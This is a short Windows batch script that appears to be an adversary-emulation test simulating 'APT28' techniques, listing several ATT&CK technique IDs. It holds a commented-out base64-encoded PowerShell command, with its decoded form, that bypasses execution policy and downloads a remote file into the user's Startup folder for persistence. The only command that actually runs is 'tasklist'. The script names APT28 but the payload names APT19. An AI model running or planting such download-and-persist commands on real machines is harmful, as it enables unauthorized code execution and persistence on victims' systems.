@ECHO OFF
CLS
color 0E


ECHO ===================================================================
ECHO [-] Simulates a typical "APT28" Execution involving multiple techniques
ECHO.
ECHO [-] Technique Involved:
ECHO     [+] T1086  PowerShell
ECHO     [+] T1027  Obfuscated Files or Information
ECHO     [+] T1059  Command-Line Interface
ECHO     [+] T1057  Process Discovery
ECHO     [+] T1105  Remote File Copy
ECHO     [+] T1083  File and Directory Discovery
ECHO     [+] T1085  Rundll32
ECHO     [+] T1064  Scripting
ECHO     [+] T1075  Pass the Hash
ECHO     [+] T1074  Data Staged
ECHO     [+] T1099  Timestomp
ECHO     [+] T1107  File Deletion
ECHO     [+] T1070  Indicator Removal on Host
ECHO -------------------------------------------------------------------
::powershell -enc UABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAHIAZQB5AGMAZQBsAC8AcABvAGMALwBtAGEAcwB0AGUAcgAvAEEAUABUADEAOQBfAFMAeQBzAGkAbgBmAG8AIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwARwByAGUAeQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABBAFAAVAAxADkAXwBTAHQAYQByAHQAdQBwAC4AYgBhAHQAIgApAA==
ECHO -------------------------------------------------------------------
::Decoded-Payload: 
::------------------
:: Powershell -ep bypass (New-Object Net.WebClient).Downloadfile(`"https://raw.githubusercontent.com/greycel/poc/master/APT19_Sysinfo`",`"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\APT19_Startup.bat`")"
cmd /k tasklist 
ECHO.


